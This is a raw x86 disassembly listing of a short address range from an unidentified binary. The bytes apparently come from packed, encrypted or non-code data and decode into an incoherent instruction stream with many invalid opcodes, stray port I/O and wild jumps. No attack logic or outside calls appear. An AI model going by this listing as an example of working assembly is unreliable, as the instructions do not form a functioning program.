  4234e3:	js     0x4234c1
  4234e5:	adc    ah,BYTE PTR [ebx+0x2e]
  4234e8:	(bad)  
  4234ea:	pop    edi
  4234eb:	push   0x4e
  4234ed:	xchg   bp,ax
  4234ef:	jns    0x423545
  4234f1:	pop    ecx
  4234f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234f3:	xor    ch,BYTE PTR [esi-0x3e2aaa55]
  4234f9:	(bad)  
  4234fa:	std    
  4234fb:	daa    
  4234fc:	add    BYTE PTR [ebx],dh
  4234fe:	adc    ah,dl
  423500:	xor    ecx,esi
  423502:	enter  0x9a29,0xf2
  423506:	jb     0x42352c
  423508:	(bad)  
  42350a:	mov    eax,0xecf00cbf
  42350f:	xchg   BYTE PTR [ecx+ebp*1+0x53d0d712],ch
  423516:	outs   dx,BYTE PTR ds:[esi]
  423517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423518:	cdq    
  423519:	and    dl,dh
  42351b:	mov    ah,0x8a
  42351d:	cmp    DWORD PTR [esi+ecx*1-0x1c],0x83ed22c9
  423525:	jl     0x423545
  423527:	sbb    BYTE PTR [edi],al
  423529:	cdq    
  42352a:	test   DWORD PTR [edx],esp
  42352c:	adc    edi,DWORD PTR [edi-0x5231e9c4]
  423532:	mov    cl,0x16
  423534:	das    
  423535:	nop
  423536:	imul   eax,edi,0x35
  423539:	sbb    edx,DWORD PTR [esp+ecx*2]
  42353c:	arpl   si,di
  42353e:	pop    ebp
  42353f:	lods   eax,DWORD PTR ds:[esi]
  423540:	pop    ecx
  423541:	mov    al,ds:0xd180ce
  423546:	sbb    BYTE PTR [esp+eax*1+0x441aca86],ch
  42354d:	mov    eax,ds:0xe7ba0e57
  423552:	or     eax,0x32be5f34
  423557:	shl    BYTE PTR [ebx],0xa2
  42355a:	fld    DWORD PTR [esi]
  42355c:	add    eax,0x98c5b096
  423561:	jmp    0x36b76f2e
  423566:	cmp    dh,BYTE PTR [edx+0x6aca8835]
  42356c:	int3   
  42356d:	xlat   BYTE PTR ds:[ebx]
  42356e:	jl     0x42355f
  423570:	mov    ah,0xde
  423572:	cmc    
  423573:	push   es
  423574:	sbb    eax,0x992829a
  423579:	mov    ecx,0x599d79ac
  42357e:	mul    ecx
  423580:	dec    eax
  423581:	out    0xea,al
  423583:	leave  
  423584:	test   al,0x86
  423586:	pop    edx
  423587:	adc    ebx,DWORD PTR [ecx+0x2a54ec79]
  42358d:	je     0x4235bd
  42358f:	jbe    0x4235fe
  423591:	loopne 0x4235bc
  423593:	push   ebp
  423594:	sub    ecx,edi
  423596:	das    
  423597:	add    esi,DWORD PTR [edi]
  423599:	push   esi
  42359a:	aam    0x90
  42359c:	xchg   esp,eax
  42359d:	mov    edi,DWORD PTR ds:0xc37ca62f
  4235a3:	cwde   
  4235a4:	popa   
  4235a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235a6:	out    0x1c,eax
  4235a8:	jg     0x423618
  4235aa:	fild   DWORD PTR [edi-0x3b]
  4235ad:	in     eax,0xfb
  4235af:	jmp    0xfc71:0x13e80ca0
  4235b6:	or     eax,0x57556771
  4235bb:	xchg   BYTE PTR [ebx-0x34c6926e],bh
  4235c1:	mov    al,ds:0x7d1559c9
  4235c6:	mov    esi,0x94991fa1
  4235cb:	test   al,0xee
  4235cd:	rcl    BYTE PTR [esi],1
  4235cf:	call   0xe8c3918e
  4235d4:	cmp    DWORD PTR [ebx+edi*1],0x7a
  4235d8:	xor    al,0x3c
  4235da:	inc    eax
  4235db:	mov    ah,0xf6
  4235dd:	inc    esp
  4235de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235df:	scas   al,BYTE PTR es:[edi]
  4235e0:	add    bl,cl
  4235e2:	cli    
  4235e3:	adc    edi,edx
  4235e5:	mov    edi,0xe0010e2f
  4235ea:	inc    esi
  4235eb:	add    dl,dh
  4235ed:	mov    ebx,0x11509522
  4235f2:	rcr    bl,cl
  4235f4:	mov    edx,0x1cf9822d
  4235f9:	imul   DWORD PTR [eax-0x8]
  4235fc:	retf   0x292e
  4235ff:	(bad)  
  423600:	in     al,dx
  423601:	loope  0x42365d
  423603:	push   ss
  423604:	lock mov edi,0x74d78907
  42360a:	add    DWORD PTR [eax+eax*2-0x5d],esi
  42360e:	adc    eax,0x8f22968d
  423613:	pop    ebp
  423614:	xchg   ebx,eax
  423615:	mov    edx,0x50cda78f
  42361a:	hlt    
  42361b:	sbb    BYTE PTR [eax+0x38],bh
  42361e:	ficomp WORD PTR [eax-0x6c]
  423621:	and    eax,0xb1a108f3
  423626:	pop    es
  423627:	rol    dl,1
  423629:	mov    edx,0xc22c9670
  42362e:	in     eax,dx
  42362f:	das    
  423630:	test   ch,dl
  423632:	pop    esp
  423633:	mov    edx,0xcdc0034b
  423638:	jg     0x4236ac
  42363a:	xchg   ecx,eax
  42363b:	adc    ch,BYTE PTR ds:0xbe06b784
  423641:	in     al,dx
  423642:	pop    esp
  423643:	dec    ebx
  423644:	dec    ecx
  423645:	dec    esp
  423646:	bnd jge 0x4236ba
  423649:	xchg   edi,eax
  42364a:	xor    esp,DWORD PTR [eax-0x6c]
  42364d:	xchg   ebx,eax
  42364e:	jbe    0x42367d
  423650:	out    dx,eax
  423651:	push   edi
  423652:	xchg   ecx,eax
  423653:	shr    BYTE PTR [ebp+0x738168e8],1
  423659:	xchg   dx,ax
  42365b:	push   ds
  42365c:	push   esi
  42365d:	adc    esp,DWORD PTR [ebp-0x4c]
  423660:	jmp    0x157d:0xb5fac931
  423667:	lds    esp,FWORD PTR [ebx+0x54]
  42366a:	sub    al,dl
  42366c:	dec    ebp
  42366d:	lods   al,BYTE PTR ds:[esi]
  42366e:	xor    eax,0xbade78da
  423673:	dec    edi
  423674:	mov    BYTE PTR [eax],dl
  423676:	push   ebp
  423677:	nop
  423678:	shr    ah,1
  42367a:	je     0x423662
  42367c:	stos   DWORD PTR es:[edi],eax
  42367d:	push   ebx
  42367e:	lods   al,BYTE PTR ds:[esi]
  42367f:	shr    ebx,cl
  423681:	sbb    al,0xe8
  423683:	scas   eax,DWORD PTR es:[edi]
  423684:	add    BYTE PTR [eax],al
  423686:	add    BYTE PTR [eax],al
  423688:	add    BYTE PTR [eax],al
  42368a:	pop    eax
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0x10a42923
  423697:	call   0xc529206f
  42369c:	add    DWORD PTR [eax],eax
  42369e:	add    BYTE PTR [esi],0x0
  4236a1:	add    BYTE PTR [ebx-0x1012b573],cl
  4236a7:	daa    
  4236a8:	sub    esp,DWORD PTR [ecx+ebx*1]
  4236ab:	call   0x4887:0x9fec16cd
  4236b2:	(bad)  
  4236b4:	std    
  4236b5:	not    DWORD PTR [ebx+0x9264c00]
  4236bb:	add    ch,ah
  4236bd:	xchg   DWORD PTR [ecx+edx*1+0x8f5e24c],edi
  4236c4:	cmp    ah,dh
  4236c6:	mov    eax,ds:0xd68d02a
  4236cb:	or     DWORD PTR [eax-0x6ba656e0],ebp
  4236d1:	pusha  
  4236d2:	or     al,0x5f
  4236d4:	cmp    bh,al
  4236d6:	xor    DWORD PTR [esi+ecx*4+0x49],edi
  4236da:	inc    ebp
  4236db:	sbb    eax,0x682b5fa6
  4236e0:	data16 loope 0x4236ce
  4236e3:	call   0x23c6:0x815c4ada
  4236ea:	mov    ah,0x62
  4236ed:	and    DWORD PTR [edx-0x6846550a],ebp
  4236f3:	sub    BYTE PTR [eax],dh
  4236f5:	(bad)  
  4236f6:	out    dx,al
  4236f7:	xor    bh,bh
  4236f9:	jmp    0x5741d2b1
  4236fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236ff:	adc    al,0x90
  423701:	in     al,dx
  423702:	adc    DWORD PTR ds:0x8b0165f8,ecx
  423708:	adc    al,0x6a
  42370a:	or     al,0x9e
  42370c:	cmp    eax,0x802acaeb
  423711:	test   eax,0x3193e860
  423716:	pop    edx
  423717:	das    
  423718:	ret    0x683
  42371b:	lds    eax,FWORD PTR [edi-0x33]
  42371e:	imul   eax,DWORD PTR [eax],0x7a16945
  423724:	cmp    esi,DWORD PTR [edi-0x25]
  423727:	out    dx,al
  423728:	cli    
  423729:	aaa    
  42372a:	sbb    eax,0xbfe033a0
  42372f:	scas   al,BYTE PTR es:[edi]
  423730:	jae    0x42374c
  423732:	je     0x423763
  423734:	xchg   ecx,eax
  423735:	adc    edx,DWORD PTR [eax-0x6]
  423738:	cmp    ebx,DWORD PTR [ebx-0x26a73fce]
  42373e:	xchg   ebx,eax
  42373f:	mov    bl,BYTE PTR [edx+esi*2+0x29c87e5]
  423746:	dec    ebp
  423747:	fisub  DWORD PTR [edx+0x505317b4]
  42374d:	outs   dx,BYTE PTR ds:[esi]
  42374e:	mov    ebx,0xe4717571
  423753:	jecxz  0x42373d
  423755:	mov    ecx,0x9811e1d9
  42375a:	push   edi
  42375b:	enter  0xe924,0xce
  42375f:	adc    eax,0x7d9a2c5
  423764:	test   DWORD PTR [ebx-0x18],edx
  423767:	ins    BYTE PTR es:[edi],dx
  423768:	inc    edi
  423769:	pop    ebp
  42376a:	inc    ebp
  42376b:	outs   dx,DWORD PTR ds:[esi]
  42376c:	jno    0x423770
  42376e:	jb     0x423767
  423770:	aaa    
  423771:	or     ah,bl
  423773:	adc    bl,dl
  423775:	pop    esp
  423776:	popf   
  423777:	(bad)  
  423778:	fcom   DWORD PTR [eax]
  42377a:	rcr    esp,cl
  42377c:	repnz scas al,BYTE PTR es:[edi]
  42377e:	jbe    0x4237fc
  423780:	adc    eax,0xcc9e5658
  423785:	fbstp  TBYTE PTR [ecx]
  423787:	mov    cl,0x17
  423789:	push   ecx
  42378a:	fdivrp st(1),st
  42378c:	lods   al,BYTE PTR ds:[esi]
  42378d:	jae    0x4237e2
  42378f:	cwde   
  423790:	cmp    ecx,DWORD PTR [ebx-0x7c]
  423793:	cli    
  423794:	mov    esi,0x1be857a7
  423799:	enter  0xf71b,0x7
  42379d:	ret    0x7bc6
  4237a0:	stos   DWORD PTR es:[edi],eax
  4237a1:	loop   0x4237c1
  4237a3:	shr    DWORD PTR [edi],0xb8
  4237a6:	call   0x7b383409
  4237ab:	xchg   edi,ebp
  4237ad:	push   esp
  4237ae:	or     al,0xaf
  4237b0:	repnz inc DWORD PTR [esi+ebx*2+0x7825c003]
  4237b8:	es inc ebp
  4237ba:	in     eax,0x88
  4237bc:	mov    dl,0xb1
  4237be:	jmp    0xb375e15c
  4237c3:	sub    bl,BYTE PTR [ebp+0x6acd3eb8]
  4237c9:	hlt    
  4237ca:	xchg   esp,eax
  4237cb:	inc    esi
  4237cc:	pop    ds
  4237cd:	shr    bh,1
  4237cf:	(bad)  
  4237d0:	cwde   
  4237d1:	jle    0x423850
  4237d3:	mov    ds:0x93afe683,eax
  4237d8:	xchg   ebp,eax
  4237d9:	popa   
  4237da:	cdq    
  4237db:	push   es
  4237dc:	mov    eax,ds:0xc6d1b024
  4237e1:	je     0x423811
  4237e3:	sar    DWORD PTR [ebx+esi*4-0x19d06ad6],cl
  4237ea:	cmp    al,0x36
  4237ec:	out    dx,al
  4237ed:	adc    bh,dh
  4237ef:	and    eax,0x12121ee9
  4237f4:	mov    al,ds:0xca3f7f92
  4237f9:	(bad)  
  4237fa:	fcmovne st,st(7)
  4237fc:	mov    ?,WORD PTR [edx+0x5ea5b72b]
  423802:	leave  
  423803:	retf   0x9a6a
  423806:	adc    eax,0x8fcecaf6
  42380b:	pusha  
  42380c:	push   ebx
  42380d:	sub    DWORD PTR [edx+edx*4-0x36c0d5b2],esp
  423814:	stos   DWORD PTR es:[edi],eax
  423815:	pushf  
  423816:	test   ecx,esp
  423818:	mov    edx,0xaf1eab6c
  42381d:	test   eax,0x622aaca3
  423822:	retf   
  423823:	cmp    eax,0x9bb7dbc4
  423828:	test   eax,0xcdef9c9f
  42382d:	adc    BYTE PTR [ebx],ch
  42382f:	outs   dx,BYTE PTR ds:[esi]
  423830:	mov    ebx,DWORD PTR [ebp-0x3c]
  423833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423834:	ins    BYTE PTR es:[edi],dx
  423835:	mov    ecx,0x4173920d
  42383a:	add    eax,DWORD PTR [ebp-0x7a9d95ab]
  423840:	mov    dh,0xbe
  423842:	out    0x96,eax
  423844:	(bad)  
  423845:	rol    ebp,cl
  423847:	mov    cl,0x3
  423849:	mov    BYTE PTR [esi+0x4e6e8a54],ah
  42384f:	xchg   ecx,eax
  423850:	out    dx,eax
  423851:	cwde   
  423852:	mov    ?,WORD PTR [ebx+ebp*2]
  423855:	(bad)  
  423856:	or     DWORD PTR [ecx+0x1b008f3c],ebx
  42385c:	shl    ah,1
  42385e:	add    BYTE PTR [ebp-0x2e7e39a5],0x72
  423865:	imul   ebx,ecx,0xffffff97
  423868:	cdq    
  423869:	addr16 mov al,ds:0x11d2
  42386d:	lods   al,BYTE PTR ds:[esi]
  42386e:	out    dx,eax
  42386f:	popf   
  423870:	or     BYTE PTR [edi-0x1a5b3a85],cl
  423876:	scas   eax,DWORD PTR es:[edi]
  423877:	and    eax,DWORD PTR es:0xe01a45cf
  42387e:	sub    BYTE PTR ds:0x5651f985,0xbf
  423885:	mov    al,0x3b
  423887:	jb     0x423858
  423889:	sbb    BYTE PTR [esi],ch
  42388b:	outs   dx,BYTE PTR ds:[esi]
  42388c:	add    ah,BYTE PTR [ebp+0x2b]
  42388f:	addr16 cld 
  423891:	dec    eax
  423892:	lds    eax,FWORD PTR [edx-0x31]
  423895:	fadd   DWORD PTR [ebx+0x3a135de]
  42389b:	lea    esp,[edi+0x52]
  42389e:	sahf   
  42389f:	xchg   edx,eax
  4238a0:	imul   esi,DWORD PTR [edi+edx*8+0x7f926ace],0x33
  4238a8:	loopne 0x42383b
  4238aa:	pop    esp
  4238ab:	pusha  
  4238ac:	scas   eax,DWORD PTR es:[edi]
  4238ad:	out    0x34,eax
  4238af:	jmp    0x6a3ebc8d
  4238b4:	sbb    dl,dh
  4238b6:	cmp    dh,BYTE PTR [eax+edx*8-0x4a]
  4238ba:	or     BYTE PTR [edi-0x24],ah
  4238bd:	test   al,0x98
  4238bf:	stos   DWORD PTR es:[edi],eax
  4238c0:	pop    ss
  4238c1:	dec    edx
  4238c2:	sbb    eax,0xf49505b5
  4238c7:	sahf   
  4238c8:	call   0xe59cb918
  4238cd:	pop    edx
  4238ce:	dec    ebp
  4238cf:	cmc    
  4238d0:	cmc    
  4238d1:	das    
  4238d2:	pop    ecx
  4238d3:	out    0xca,eax
  4238d5:	xlat   BYTE PTR ds:[ebx]
  4238d6:	jno    0x423935
  4238d8:	pop    es
  4238d9:	test   BYTE PTR [edi-0x4bfc0a89],ch
  4238df:	pop    esp
  4238e0:	mov    bh,0x2d
  4238e2:	cs aaa 
  4238e4:	add    al,BYTE PTR [ecx+0x35]
  4238e7:	jno    0x42393f
  4238e9:	retf   0x6238
  4238ec:	xor    edi,DWORD PTR [edx-0x28]
  4238ef:	mov    ecx,0x975821d7
  4238f4:	mov    eax,0xc967982f
  4238f9:	mov    ch,0xba
  4238fb:	add    ebp,esi
  4238fd:	dec    esi
  4238fe:	das    
  4238ff:	pop    es
  423900:	inc    esi
  423901:	xor    ebp,DWORD PTR [esi-0x5eb5b3b9]
  423907:	rcr    DWORD PTR [ebp+esi*1+0x6d],0xc
  42390c:	fmul   QWORD PTR [ecx-0x23c67cd7]
  423912:	or     al,bl
  423914:	je     0x4238b0
  423916:	mov    cl,0xe4
  423918:	cwde   
  423919:	xchg   esp,eax
  42391a:	ja     0x423997
  42391c:	jae    0x423968
  42391e:	and    al,0xc5
  423920:	pop    eax
  423921:	cmp    BYTE PTR [edi],al
  423923:	je     0x4238af
  423925:	xlat   BYTE PTR ds:[ebx]
  423926:	jns    0x4238bd
  423928:	ror    DWORD PTR [ecx],1
  42392a:	xchg   esi,eax
  42392b:	nop
  42392c:	es jae 0x4238ec
  42392f:	mov    bh,BYTE PTR [ecx]
  423931:	jp     0x4238cc
  423933:	int3   
  423934:	xchg   DWORD PTR [edi],esi
  423936:	adc    eax,0x2898b9dc
  42393b:	xchg   esi,eax
  42393c:	(bad)  
  42393d:	sub    al,BYTE PTR [ecx]
  42393f:	jo     0x4238c8
  423941:	sub    DWORD PTR [edx-0x141a7a79],esp
  423947:	adc    DWORD PTR gs:[ebx-0x6d0b47e6],0x9df845c5
  423952:	fs xchg edx,eax
  423954:	cld    
  423955:	(bad)  
  423956:	cmc    
  423957:	sbb    BYTE PTR [esi],0x55
  42395a:	jbe    0x4239d1
  42395c:	jbe    0x423925
  42395e:	or     ch,bl
  423960:	jg     0x4239e1
  423962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423963:	inc    edi
  423964:	xchg   esp,eax
  423965:	adc    eax,DWORD PTR [esi+0x7a]
  423968:	frstor [ecx+ebx*8]
  42396b:	push   0x8c970afa
  423970:	test   al,0xc4
  423972:	pop    ebp
  423973:	or     eax,0xa31f4c9d
  423978:	mov    cl,0x3c
  42397a:	ret    
  42397b:	cmp    al,0x2
  42397d:	sbb    esp,ebx
  42397f:	js     0x4239c1
  423981:	xchg   ecx,eax
  423982:	daa    
  423983:	pushf  
  423984:	les    ebp,FWORD PTR [ecx+0x3b]
  423987:	dec    ebx
  423988:	hlt    
  423989:	push   edx
  42398a:	sbb    DWORD PTR [eax+0x3bbc370c],ebx
  423990:	(bad)  
  423991:	mov    ch,0x45
  423993:	loope  0x4239d9
  423995:	in     al,0x6e
  423997:	inc    ebx
  423998:	jnp    0x15d91b25
  42399e:	dec    esp
  42399f:	add    eax,0xd47e72e
  4239a4:	inc    esi
  4239a5:	ja     0x42399b
  4239a7:	xchg   DWORD PTR [ebx-0x4e],ebx
  4239aa:	xor    BYTE PTR [ecx],ah
  4239ac:	js     0x4239a5
  4239ae:	xor    al,BYTE PTR [eax*4+0x594ba683]
  4239b5:	test   al,0x5e
  4239b7:	and    BYTE PTR [ebp-0x50],ah
  4239ba:	scas   al,BYTE PTR es:[edi]
  4239bb:	jnp    0x423a13
  4239bd:	cli    
  4239be:	fsubr  DWORD PTR [ecx-0x354b749d]
  4239c4:	int3   
  4239c5:	push   ecx
  4239c6:	or     BYTE PTR [ebx],0x7d
  4239c9:	cmp    ah,BYTE PTR [edi+0x5]
  4239cc:	inc    ebx
  4239cd:	adc    bl,ch
  4239cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239d0:	push   ebx
  4239d1:	in     al,dx
  4239d2:	in     al,dx
  4239d3:	mov    ch,0x81
  4239d5:	mov    ch,0xf0
  4239d7:	and    eax,0xfaaa781
  4239dc:	jb     0x42396c
  4239de:	call   0xeb925001
  4239e3:	or     DWORD PTR [esi],esp
  4239e5:	push   edx
  4239e6:	ins    DWORD PTR es:[edi],dx
  4239e7:	mov    bl,BYTE PTR [ebx]
  4239e9:	jl     0x423993
  4239eb:	add    al,0x18
  4239ed:	mov    ebp,0x87732304
  4239f2:	cmp    ch,BYTE PTR [ebx-0x55]
  4239f5:	adc    eax,0x20cae521
  4239fa:	mov    dl,0x6e
  4239fc:	scas   eax,DWORD PTR es:[edi]
  4239fd:	mov    ds:0x7e0a0a8e,eax
  423a02:	lahf   
  423a03:	js     0x423a81
  423a05:	xchg   esi,eax
  423a06:	push   eax
  423a07:	mov    ebp,0xfc603f4f
  423a0c:	ins    BYTE PTR es:[edi],dx
  423a0d:	cwde   
  423a0e:	imul   esi,DWORD PTR ds:0x2954de10,0x49737107
  423a18:	jmp    0x2a55cd07
  423a1d:	hlt    
  423a1e:	cmp    al,0x31
  423a20:	popf   
  423a21:	inc    esi
  423a22:	jae    0x423a27
  423a24:	mov    ecx,0x8238cca
  423a29:	sbb    al,dl
  423a2b:	popf   
  423a2c:	cmp    BYTE PTR [ebx-0x636e0308],dh
  423a32:	inc    ebx
  423a33:	push   0xc39fc483
  423a38:	sbb    BYTE PTR [ebx],dl
  423a3a:	dec    eax
  423a3b:	pop    esi
  423a3d:	lahf   
  423a3e:	ficomp DWORD PTR [edx]
  423a40:	ret    
  423a41:	inc    edx
  423a42:	mov    ch,0xeb
  423a44:	dec    eax
  423a45:	push   cs
  423a46:	aas    
  423a47:	lods   al,BYTE PTR ds:[esi]
  423a48:	daa    
  423a49:	test   eax,edx
  423a4b:	or     al,al
  423a4d:	cs push ebp
  423a4f:	sahf   
  423a50:	pusha  
  423a51:	mov    dl,0x51
  423a53:	mov    ds:0xb8a27693,al
  423a58:	in     al,0xd0
  423a5a:	leave  
  423a5b:	repz test al,0x40
  423a5e:	jl     0x423a3a
  423a60:	outs   dx,DWORD PTR ds:[esi]
  423a61:	mov    ds:0xd9ba398c,eax
  423a66:	loop   0x423a8b
  423a68:	dec    ebx
  423a69:	jbe    0x423a77
  423a6b:	(bad)  
  423a6d:	loope  0x423a96
  423a6f:	iret   
  423a70:	ret    
  423a71:	pop    edx
  423a72:	cmp    DWORD PTR [edi],0xffffff9e
  423a75:	cmp    cl,BYTE PTR [edx+edx*2+0x53]
  423a79:	gs or  al,0xa5
  423a7c:	fiadd  DWORD PTR [ecx+0x63]
  423a7f:	jp     0x423a5e
  423a81:	xor    eax,0xc8ea2d19
  423a86:	inc    ebx
  423a87:	cmp    eax,0x8e9db0bc
  423a8c:	sub    eax,0x2b5de81a
  423a91:	aas    
  423a92:	out    0x82,eax
  423a94:	and    cl,dl
  423a96:	jle    0x423abc
  423a98:	jecxz  0x423a6d
  423a9a:	js     0x423b11
  423a9c:	mov    bh,0xe8
  423a9e:	fld    QWORD PTR [esi-0x5f]
  423aa1:	dec    eax
  423aa2:	int3   
  423aa3:	ins    DWORD PTR es:[edi],dx
  423aa4:	xor    DWORD PTR [ebx+ebx*8],ebp
  423aa7:	fidiv  DWORD PTR [eax]
  423aa9:	cs mov ch,0xbd
  423aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423aad:	ds cmc 
  423aaf:	sbb    eax,0x90acb9a5
  423ab4:	xlat   BYTE PTR ds:[ebx]
  423ab5:	xchg   ecx,eax
  423ab6:	xchg   DWORD PTR [esi-0x23470710],edx
  423abc:	mov    ecx,DWORD PTR [ecx]
  423abe:	mov    bl,0x3e
  423ac0:	jnp    0x423a99
  423ac2:	xchg   DWORD PTR [ebx-0x5],eax
  423ac5:	jle    0x423b2b
  423ac7:	je     0x423b19
  423ac9:	pop    ecx
  423aca:	add    BYTE PTR [ebx],cl
  423acc:	jle    0x423a93
  423ace:	or     ebx,DWORD PTR [esi]
  423ad0:	push   edx
  423ad1:	sbb    al,0xe0
  423ad3:	cwde   
  423ad4:	adc    ecx,esp
  423ad6:	mov    ds:0x11212c3e,al
  423adb:	ins    BYTE PTR es:[edi],dx
  423adc:	rcl    BYTE PTR [ecx],1
  423ade:	fiadd  DWORD PTR [ecx]
  423ae0:	jo     0x423af9
  423ae2:	rol    DWORD PTR [ebx+0x3aee8ea4],0x87
  423ae9:	mov    edi,ds
  423aeb:	mov    bl,0xf9
  423aed:	ret    
  423aee:	add    al,0xf0
  423af0:	cmp    dl,BYTE PTR [edx-0x5e]
  423af3:	jnp    0x423af5
  423af5:	cld    
  423af6:	leave  
  423af7:	rcl    BYTE PTR [esi-0x2c1f68fa],cl
  423afd:	and    eax,0xd1bb8b52
  423b02:	mov    ah,0xfb
  423b04:	(bad)  
  423b06:	scas   eax,DWORD PTR es:[edi]
  423b07:	fwait
  423b08:	retf   
  423b09:	rcr    BYTE PTR [esi+ecx*4],1
  423b0c:	mov    dl,0x35
  423b0e:	mov    dh,0x19
  423b10:	(bad)  
  423b11:	pusha  
  423b12:	mov    dh,0xd2
  423b14:	dec    eax
  423b15:	xor    DWORD PTR [esi],ebp
  423b17:	rcr    DWORD PTR [esi],cl
  423b19:	pop    ecx
  423b1a:	mov    DWORD PTR ds:0xd697d250,edx
  423b20:	cs das 
  423b22:	data16 fimul DWORD PTR [esi]
  423b25:	jns    0x423b2d
  423b27:	mov    gs,WORD PTR [edi+0x67a08b4e]
  423b2d:	xor    eax,0x4b27e1a5
  423b32:	xchg   ebp,eax
  423b33:	sub    al,0xc3
  423b35:	or     eax,0x71dd9024
  423b3a:	retf   0x3e89
  423b3d:	xchg   edi,eax
  423b3e:	das    
  423b3f:	jbe    0x423b42
  423b41:	(bad)  
  423b42:	fcomi  st,st(2)
  423b44:	ds jl  0x423baf
  423b47:	retf   
  423b48:	pushf  
  423b49:	cmps   BYTE PTR es:[si],BYTE PTR es:[di]
  423b4c:	and    al,0xb8
  423b4e:	cwde   
  423b4f:	dec    edx
  423b50:	push   ecx
  423b51:	aas    
  423b52:	mov    WORD PTR [edx-0x1b],?
  423b55:	test   al,0xb1
  423b57:	pop    edi
  423b58:	mov    ah,0x6b
  423b5a:	jle    0x423b7f
  423b5c:	test   DWORD PTR [ebx+0x74],esp
  423b5f:	adc    ebp,esp
  423b61:	fs mov ebx,0x288825e
  423b67:	sahf   
  423b68:	(bad)  
  423b69:	jo     0x423b85
  423b6b:	fnstcw WORD PTR [ebp+0x50]
  423b6e:	shl    BYTE PTR [edx-0x37f23a3c],1
  423b74:	jl     0x423bd6
  423b76:	je     0x423bf7
  423b78:	lock fnsave ss:[esi+0x558ee60]
  423b80:	xlat   BYTE PTR ds:[ebx]
  423b81:	sub    ebx,DWORD PTR [ecx-0x4f033098]
  423b87:	and    ah,BYTE PTR [esi]
  423b89:	push   edx
  423b8a:	stos   BYTE PTR es:[edi],al
  423b8b:	adc    BYTE PTR [ecx+0x5133a9a1],bl
  423b91:	daa    
  423b92:	mov    esp,0xda9ab56a
  423b97:	jb     0x423b3a
  423b99:	push   es
  423b9a:	sub    al,0x81
  423b9c:	scas   eax,DWORD PTR es:[edi]
  423b9d:	adc    DWORD PTR [eax+0x1],esp
  423ba0:	dec    ebp
  423ba1:	hlt    
  423ba2:	clc    
  423ba3:	mov    ?,WORD PTR [esi]
  423ba5:	sub    ah,BYTE PTR [esi]
  423ba7:	cmp    DWORD PTR [edi+0x4008d21f],ecx
  423bad:	cmp    ebp,DWORD PTR [edi]
  423baf:	ja     0x423bec
  423bb1:	sbb    al,0x1b
  423bb3:	xchg   edi,eax
  423bb4:	outs   dx,BYTE PTR ds:[esi]
  423bb5:	mov    esp,0xc7392100
  423bba:	push   ebx
  423bbb:	cmp    ecx,eax
  423bbd:	jae    0x423bb2
  423bbf:	and    esi,DWORD PTR cs:[edi-0x2bbd8b10]
  423bc6:	cmp    BYTE PTR [eax],0x91
  423bc9:	mov    esp,0x1319c321
  423bce:	icebp  
  423bcf:	mov    es,esp
  423bd1:	mov    edi,0xf25d906
  423bd6:	or     BYTE PTR [eax-0x2a],ch
  423bd9:	and    BYTE PTR [ecx+0x78],ch
  423bdc:	jae    0x423c18
  423bde:	sbb    ecx,DWORD PTR [ebx*8-0x4531cdfd]
  423be5:	jne    0x423c0f
  423be7:	add    DWORD PTR [esi+0x1f],ebp
  423bea:	dec    ecx
  423beb:	xor    al,0x39
  423bed:	ficomp DWORD PTR [ebp+0x1c04fb62]
  423bf3:	pop    edi
  423bf4:	xor    al,0x9f
  423bf7:	shld   DWORD PTR [edi],esp,cl
  423bfa:	in     eax,dx
  423bfb:	pop    es
  423bfc:	mov    ebp,0xbaa009c4
  423c01:	out    0x4d,al
  423c03:	sahf   
  423c04:	stos   BYTE PTR es:[edi],al
  423c05:	sub    dl,BYTE PTR [esi+0x6164e0a1]
  423c0b:	cmp    dl,0x38
  423c0e:	mov    ebp,DWORD PTR [edi+esi*8-0x6a]
  423c12:	jne    0x423c27
  423c14:	sti    
  423c15:	fdiv   DWORD PTR [esi]
  423c17:	inc    ebx
  423c18:	fst    st(1)
  423c1a:	pop    es
  423c1b:	sbb    BYTE PTR [ecx+edx*2+0x596d3a8f],0x52
  423c23:	or     ah,al
  423c25:	sbb    BYTE PTR [esi-0x6438d4e3],dl
  423c2b:	loop   0x423c9a
  423c2d:	repnz enter 0xc0a0,0xc4
  423c32:	pushf  
  423c33:	sbb    bh,BYTE PTR [esi]
  423c35:	retf   0x931a
  423c38:	das    
  423c39:	mov    al,ds:0xe7eebad3
  423c3e:	or     DWORD PTR [eax+0x759741d1],eax
  423c44:	push   esi
  423c45:	es mov edi,0x5c4fd7eb
  423c4b:	xchg   esi,eax
  423c4c:	in     al,0x70
  423c4e:	jmp    0xdfcc:0x69af2058
  423c55:	ins    DWORD PTR es:[edi],dx
  423c56:	pusha  
  423c57:	repnz int 0xb1
  423c5a:	pop    eax
  423c5b:	pop    esp
  423c5c:	sub    eax,0x5bbe90d8
  423c61:	sar    edi,1
  423c63:	dec    esi
  423c64:	push   cs
  423c65:	mov    esi,0x702d8823
  423c6a:	(bad)  
  423c6b:	push   ebx
  423c6c:	outs   dx,BYTE PTR ds:[esi]
  423c6d:	int    0xe7
  423c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c70:	mov    edi,0xa7416b3e
  423c75:	inc    eax
  423c76:	xor    al,0xac
  423c78:	shl    cl,0x57
  423c7b:	in     al,dx
  423c7c:	retf   0x1054
  423c7f:	cs es sub al,0xaf
  423c83:	nop
  423c84:	and    DWORD PTR [ecx+0x3c],ecx
  423c87:	cmp    esi,ecx
  423c89:	pop    edi
  423c8a:	pop    esi
  423c8b:	sahf   
  423c8c:	sub    DWORD PTR [ebx-0x95e7080],eax
  423c92:	enter  0x72b3,0xf4
  423c96:	push   esp
  423c97:	cmp    DWORD PTR [eax+ebx*8+0x5b],0x4258cf00
  423c9f:	push   edi
  423ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
